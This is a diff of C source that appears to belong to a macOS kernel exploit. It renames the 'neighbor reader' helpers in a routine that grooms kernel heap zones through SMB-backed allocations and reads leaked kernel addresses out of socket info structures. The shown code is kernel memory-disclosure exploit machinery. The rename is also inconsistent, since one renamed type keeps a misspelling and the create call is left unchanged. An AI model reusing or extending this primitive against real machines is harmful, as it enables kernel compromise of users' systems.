@@ -17,7 +17,7 @@
 #include "../smb/ssn_allocator.h"
 
 #include "zalloc_kext_small.h"
-#include "neighbor_reader.h"
+#include "zkext_neighbor_reader.h"
 #include "allocator_rw.h"
 #include "util_misc.h"
 #include "util_log.h"
@@ -50,7 +50,7 @@ int kmem_zalloc_kext_small_try(const struct sockaddr_in* smb_addr, char* data, s
     }
     assert(zone_size > 0);
     
-    kmem_neighour_reader_t reader = kmem_neighbor_reader_create();
+    kmem_zkext_neighour_reader_t reader = kmem_neighbor_reader_create();
     
     smb_nic_allocator offset_allocator = smb_nic_allocator_create(smb_addr, sizeof(*smb_addr));
     smb_nic_allocator pad_allocator = smb_nic_allocator_create(smb_addr, sizeof(*smb_addr));
@@ -141,10 +141,10 @@ int kmem_zalloc_kext_small_try(const struct sockaddr_in* smb_addr, char* data, s
         
     for (int try = 0; try < MAX_TRIES; try++) {
 //        XE_LOG_INFO("try %d / %d", try, MAX_TRIES);
-        kmem_neighbor_reader_prepare(reader, data_reader, sizeof(data_reader));
+        kmem_zkext_neighbor_reader_prepare(reader, data_reader, sizeof(data_reader));
         struct socket_fdinfo modified[8];
         size_t num_modified = XE_ARRAY_SIZE(modified);
-        kmem_neighbor_reader_read_modified(reader, modified, &num_modified);
+        kmem_zkext_neighbor_reader_read_modified(reader, modified, &num_modified);
         
         for (int i = 0; i < num_modified; i++) {
             uintptr_t* addr = (uintptr_t*)&modified[i].psi.soi_proto.pri_un.unsi_addr.ua_sun;
@@ -158,12 +158,12 @@ int kmem_zalloc_kext_small_try(const struct sockaddr_in* smb_addr, char* data, s
             }
         }
         
-        kmem_neighbor_reader_reset(reader);
+        kmem_zkext_neighbor_reader_reset(reader);
     }
     
     error = EAGAIN;
 done:
-    kmem_neighbor_reader_destroy(&reader);
+    kmem_zkext_neighbor_reader_destroy(&reader);
     smb_nic_allocator_destroy(&pad_allocator);
     dispatch_apply(NUM_SIZE_ELEMENTS / 4, DISPATCH_APPLY_AUTO, ^(size_t index) {
         smb_ssn_allocator_destroy(&size_allocators[index]);
